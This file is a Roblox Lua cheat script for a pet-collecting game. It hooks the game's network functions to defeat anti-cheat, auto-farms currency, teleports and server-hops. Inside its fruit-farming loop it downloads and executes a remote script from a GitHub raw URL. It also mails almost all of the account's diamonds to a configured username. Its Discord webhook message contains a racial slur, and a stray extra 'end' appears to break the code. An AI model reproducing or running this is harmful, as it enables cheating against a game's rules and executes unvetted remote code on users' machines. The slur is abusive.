repeat
    task.wait()
until game.PlaceId ~= nil
if not game:IsLoaded() then
    game.Loaded:Wait()
end
repeat task.wait() until not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("__INTRO")

print("waiting 200s")

wait(2) --FPS

local InputService = game:GetService'UserInputService'
local RunService   = game:GetService'RunService'

RunService:Set3dRenderingEnabled(false)
InputService.WindowFocused:Connect(function()
    RunService:Set3dRenderingEnabled(true)
end)

InputService.WindowFocusReleased:Connect(function()
    RunService:Set3dRenderingEnabled(false)
end)
setfpscap(30)



wait(2) --ANTI AFK


--ANTI AFK
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

wait(2)

--VARIABLES/LOCALS
local platform = nil
local teleportingEnabled = true
local oldJob = game.JobId
local v1 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
while not v1.Loaded do
    game:GetService("RunService").Heartbeat:Wait();
end;
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
local Fire, Invoke = Network.Fire, Network.Invoke
local old
old = hookfunction(getupvalue(Fire, 1), function(...)
   return true
end)
local TimeElapsed = 0
local GemsEarned = 0
local TotalGemsEarned = 0
local Library = require(game:GetService("ReplicatedStorage").Library)
local StartingGems = Library.Save.Get().Diamonds
local timer = coroutine.create(function()
    while 1 do
        TimeElapsed = TimeElapsed + 1
        wait(1)
    end
end)
coroutine.resume(timer)

--Settings

--disable orbs render
game:GetService("Workspace")["__THINGS"].Orbs.ChildAdded:Connect(function(v)
	pcall(function()
		v.Orb.Enabled = false
	end)
end)

--disable lootbag render
game:GetService("Workspace")["__THINGS"].Lootbags.ChildAdded:Connect(function(v)
	pcall(function()
		v.Transparency = 1
		v.ParticleEmitter:Destroy()
	end)
end)

--collect orbs
game.Workspace['__THINGS'].Orbs.ChildAdded:Connect(function(v)
    Fire("Claim Orbs", {v.Name})
end)

--collect lootbags
game.Workspace['__THINGS'].Lootbags.ChildAdded:Connect(function(v)
    Fire("Collect Lootbag", v.Name, v.Position)
end)

--instant coin fall
local WorldCoins = Library.Things:WaitForChild("Coins")
WorldCoins.ChildAdded:Connect(function(ch) 
    ch:SetAttribute("HasLanded", true)
    ch:SetAttribute("IsFalling", false)
        
    local coin = ch:WaitForChild("Coin")
    coin:SetAttribute("InstantLand", true)
end)

wait(8)

--FUNCTIONS
function attack_coin(id, equip)
    local v86 = Invoke("Join Coin", id, equip)
    for v88, v89 in pairs(v86) do
        Fire("Farm Coin", id, v88);
    end
end

function wait_until_broken(id)
    while 1 do
        wait(0.01)
        for i,v in pairs(Invoke("Get Coins")) do
            found = false
            if i == id then
                if #v.petsFarming ~= 0 then
                    found = true
                end
            end
        end
        if not found then break end
    end
end

function GetOranges()
    local FruitLib = require(game.ReplicatedStorage.Library.Client.FruitCmds)

    local Fruit = FruitLib.Directory.Orange
    return math.floor(FruitLib.Get(game.Players.LocalPlayer, Fruit))
end

function create_platform(x, y, z)
	local p = Instance.new("Part")
	p.Anchored = true
	p.Name = "plat"
	p.Position = Vector3.new(x, y, z)
	p.Size = Vector3.new(100, 1, 100)
	p.Parent = game.Workspace
end

function serverHop()
    repeat
        local data = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/6284583030/servers/Public?sortOrder=Dsc&excludeFullGames=true&limit=100"))
        local bestserver
        for i,v in pairs(data.data) do
           if v.playing == 11 then
            bestserver = v.id
          end
        end
        
        game:GetService("TeleportService"):TeleportToPlaceInstance(6284583030, bestserver, game.Players.LocalPlayer)
        task.wait(2)
    until oldJob ~= game.JobId
end

local function formatNumber(number)
    return tostring(number):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

function add_suffix(inte)
    local gems = inte
    local gems_formatted

    if gems >= 1000000000000 then  -- if gems are greater than or equal to 1 trillion
        gems_formatted = string.format("%.1ft", gems / 1000000000000)  -- display gems in trillions with one decimal point
    elseif gems >= 1000000000 then  -- if gems are greater than or equal to 1 billion
        gems_formatted = string.format("%.1fb", gems / 1000000000)  -- display gems in billions with one decimal point
    elseif gems >= 1000000 then  -- if gems are greater than or equal to 1 million
        gems_formatted = string.format("%.1fm", gems / 1000000)  -- display gems in millions with one decimal point
    elseif gems >= 1000 then  -- if gems are greater than or equal to 1 thousand
        gems_formatted = string.format("%.1fk", gems / 1000)  -- display gems in thousands with one decimal point
    else  -- if gems are less than 1 thousand
        gems_formatted = tostring(gems)  -- display gems as is
    end

    return gems_formatted
end

function sendUpdate()
	request({
		Url = getgenv().Settings["Webhooks"]["Webhook"],
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode{
            ["content"] = "",
            ["embeds"] = {
			    {
			      ["title"] = "Mining Stats Update",
			      ["description"] = "Successfully Nigga!",
			      ["color"] = 5814783,
			      ["fields"] = {
			        {
			          ["name"] = "Stats: ",
			          ["value"] = ":clock1: **Took:** ``"..TimeElapsed.."s``\n:gem: **Earned:** ``"..formatNumber(GemsEarned).."``\n:gem: **Total Gems:** ``"..add_suffix(Library.Save.Get().Diamonds).."``\n:clock1: **Time:** <t:"..os.time()..":F>"
			        }
			      },
			      ["author"] = {
			        ["name"] = "Mystic Farmer - Stats"
			      }
			    }
			  }
			  }
	})
end

function Teleport(x, y, z)
    local character = game:GetService("Players").LocalPlayer.Character or game:GetService("Players").LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    CurrentPosition = character:WaitForChild("HumanoidRootPart").CFrame
    task.wait()

    humanoidRootPart.CFrame = CFrame.new(x, y, z)
end

function get_coins_in_area(area)
    local allCoins = Invoke("Get Coins") -- this gets every coin in the world you are in
    local coinsInArea = {} -- Make a blank list that will store all the ids of the coins in the area
    
    for coinid,coindata in pairs(allCoins) do -- Loop through every coin in the world
        if coindata.a == area and not string.find(coindata.n, "Chest") then -- if the area the coin is in is in the area you specify then...
            table.insert(coinsInArea, coinid) -- add the coin id to the coinsinarea table
        end
    end
    return coinsInArea
end

function FrTeleportToWorld(world, area)
    local Library = require(game:GetService("ReplicatedStorage").Library)
    Library.WorldCmds.Load(world)
    wait(0.25)
    local areaTeleport = Library.WorldCmds.GetMap().Teleports:FindFirstChild(area)
    Library.Signal.Fire("Teleporting")
    task.wait(0.25)
    local Character = game.Players.LocalPlayer.Character
    local Humanoid = Character.Humanoid
    local HumanoidRootPart = Character.HumanoidRootPart
    Character:PivotTo(areaTeleport.CFrame + areaTeleport.CFrame.UpVector * (Humanoid.HipHeight + HumanoidRootPart.Size.Y / 2))
    Library.Network.Fire("Performed Teleport", area)
    task.wait(0.25)
end

function FrTeleportToArea(world, area)
local areaTeleport = Library.WorldCmds.GetMap().Teleports:FindFirstChild(area)
    local Character = game.Players.LocalPlayer.Character
    local Humanoid = Character.Humanoid
    local HumanoidRootPart = Character.HumanoidRootPart
    Character:PivotTo(areaTeleport.CFrame + areaTeleport.CFrame.UpVector * (Humanoid.HipHeight + HumanoidRootPart.Size.Y / 2))
    Library.Network.Fire("Performed Teleport", area)

end

function fruitFarm()
    FrTeleportToWorld("Pixel", "Pixel Vault")
    wait(3)
    while 1 do
        wait(1)
        PETS = Library.Save.Get().PetsEquipped
        newP = {}
        for i, v in pairs(PETS) do
            table.insert(newP, i)
        end

        local pixel_coins = get_coins_in_area("Pixel Vault")
        for i, v in pairs(pixel_coins) do
            attack_coin(i, newP)
            wait(0.05)
            wait_until_broken(i)
        end

        getgenv().boothsnipe = false
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua"))()


        if GetOranges() >= 190 then
            break
        end
    end
end

------------------------------------------------------------------------------------------------------------------------
--claim gifts
local redeemgift = coroutine.create(function()
    while 1 do
        wait(1)
        for _,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.FreeGifts.Frame.Container.Gifts:GetDescendants()) do
            if v.ClassName == "TextLabel" and v.Text == "Redeem!" then
                local giftName = v.Parent.Name
                local number = string.match(giftName, "%d+")
                Invoke("Redeem Free Gift", tonumber(number))
            end
        end
    end
end)
coroutine.resume(redeemgift)
--x3 damage

------------------------------------------------------------------------------------------------------------------------

function utomel()
    local Library = require(game:GetService("ReplicatedStorage").Library)
    debug.setupvalue(Library.Network.Invoke, 1, function() return true end)
    debug.setupvalue(Library.Network.Fire, 1, function() return true end)

    wait(1) --tp's near the mail
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(254.149002, 98.2168579, 349.55304, 0.965907216, -6.73597569e-08, -0.258888513, 6.48122409e-08, 1, -1.83752729e-08, 0.258888513, 9.69664127e-10, 0.965907216)

    wait(2)
    local Gems2 = Library.Save.Get().Diamonds
    repeat
        wait()
        Gems2 = Library.Save.Get().Diamonds
    until Gems2 ~= nil

    local function SendMail(username)
        local args = {
            Recipient = username,
            Message = "",
            Pets = {},
            Diamonds = Gems2 - 100000
        }
        return Library.Network.Invoke("Send Mail", args)
    end

    SendMail(getgenv().Settings["Utomel Username"])

    -- local function SendMail(username)
    --     local args = {
    --         Recipient = username,
    --         Message = "",
    --         Pets = {},
    --         Diamonds = 50000000000 - 100000
    --     }
    --     return Library.Network.Invoke("Send Mail", args)
    -- end

    -- SendMail(getgenv().Settings["Utomel Username"])
end
end


------------------------------------------------------------------------------------------------------------------------
--check fruits
if GetOranges() <= 30 then
    fruitFarm()
end





local isInDiamondMine = Library.WorldCmds.Get()
if isInDiamondMine == "Diamond Mine" then
	print('in diamond mine!')
else
	if isInDiamondMine ~= "Spawn" then
		pcall(FrTeleportToWorld, 'Spawn', 'Shop')
		wait(5)
		if workspace.__MAP.Interactive["Diamond Mine Collapsed Sign"].Main.Transparency ~= 1 then
			repeat wait() until workspace.__MAP.Interactive["Diamond Mine Collapsed Sign"].Main.Transparency == 1
		end
		pcall(FrTeleportToWorld, 'Diamond Mine', 'Mystic Mine')
	else
        wait(10)
        print("Attempting to send gems")
        if Library.Save.Get().Diamonds ~= 50000000000 then
            pcall(utomel)
        end


        print("waiting for diamond mine to open!")
		if workspace.__MAP.Interactive["Diamond Mine Collapsed Sign"].Main.Transparency ~= 1 then
			repeat wait() until workspace.__MAP.Interactive["Diamond Mine Collapsed Sign"].Main.Transparency == 1
		end
		pcall(FrTeleportToWorld, 'Diamond Mine', 'Mystic Mine')
        
	end
end



--check if mine collapsed
--local isInDiamondMine = Library.WorldCmds.Get()
--if isInDiamondMine == "Diamond Mine" then
--    print('in diamond mine!')
---else
 --   local success, failed = pcall(FrTeleportToWorld, 'Diamond Mine', 'Mystic Mine') --tries to tp in mine, if not allowed, send mel
 --   if success then
--        print('Successful tp')
   --     wait(1)
 --   end
 --   if not success then

 --      wait(20)
 --       print("tring to send gems in mail")
 --       pcall(utomel) --- auto mail becereyfyl
 --   end
--end

create_platform(9043.19, -32, 2424.63)
wait(0.1)
create_platform(8658.12, -32, 3020.79)

--start
--get pets
PETS = Library.Save.Get().PetsEquipped
newP = {}
for i,v in pairs(PETS) do 
    table.insert(newP, i) 
end




Fire("Performed Teleport")
wait(0.5)


print("doing farm")
local farm = coroutine.create(function()


    local isInDiamondMine = Library.WorldCmds.Get()


    while 1 do
        
        if isInDiamondMine == "Diamond Mine" then
            print('in diamond mine!')
        else
            break
        end

        wait(0.1)
        Teleport(9043.19, -30, 2424.63)
        --get coins in mystic mine
        AllC = Invoke("Get Coins")
        AllNeededCoinsChest = {}
        for i, v in pairs(AllC) do
            if v.a == "Mystic Mine" then
                if string.find(v.n, "Giant Chest") then
                    AllNeededCoinsChest[i] = v
                    print(tostring(v.n))
                end
            end
        end

        --break Chest in mystic mine
        for i, v in pairs(AllNeededCoinsChest) do
            local v86 = Invoke("Join Coin", i, newP)
            for v88, v89 in pairs(v86) do
                Fire("Farm Coin", i, v88);
                -- print(i, v88)
                -- print(newP)
            end
            while 1 do
                wait(0.04)
                AllC = Invoke("Get Coins")
                f = false
                for i2,v2 in pairs(AllC) do
                    if i2 == i then f = true end
                end
                if not f then break end
            end
        end

        --break coins in mystic mine
        AllC = Invoke("Get Coins")
        AllNeededCoins = {}
        for i, v in pairs(AllC) do
            if v.a == "Mystic Mine" and not string.find(v.n, "Giant Chest") then
                AllNeededCoins[i] = v
                print(tostring(v.n))
            end
        end

        for i, v in pairs(AllNeededCoins) do
            attack_coin(i, newP)
            task.wait(0.04)
        end

        wait(0.1)
        Teleport(8658.12, -30, 3020.79)

        Fire("Performed Teleport")
        wait(0.5)
        AllC = Invoke("Get Coins")
        AllNeededCoinsCyber = {} --only destroy chest in Cyber Cavern
        for i, v in pairs(AllC) do
            if v.a == "Cyber Cavern" then
                AllNeededCoinsCyber[i] = v
                print(tostring(v.n))
            end
        end
        --break coins in cyber cavern
        for i, v in pairs(AllNeededCoinsCyber) do
            attack_coin(i, newP)
            task.wait(0.04)
        end

        wait(1)
        isInDiamondMine = Library.WorldCmds.Get()
    end
end)
coroutine.resume(farm)





--end
wait(2)
while 1 do
    local EndingGems = Library.Save.Get().Diamonds
    GemsEarned = EndingGems - StartingGems
    pcall(sendUpdate)
    wait(600)
end
